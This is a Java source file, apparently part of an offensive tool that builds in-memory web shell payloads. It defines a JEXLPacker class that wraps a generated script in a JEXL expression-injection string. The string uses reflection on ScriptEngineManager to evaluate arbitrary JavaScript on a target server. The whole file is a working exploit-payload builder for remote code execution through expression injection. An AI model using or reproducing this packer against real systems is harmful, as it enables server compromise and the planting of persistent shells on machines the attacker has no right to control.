package org.leo.jmg.mem.packer.jexl;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "JEXL", order = 100)
public class JEXLPacker implements Packer {
    String template = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        return template.replace("{{script}}", script);
    }
}

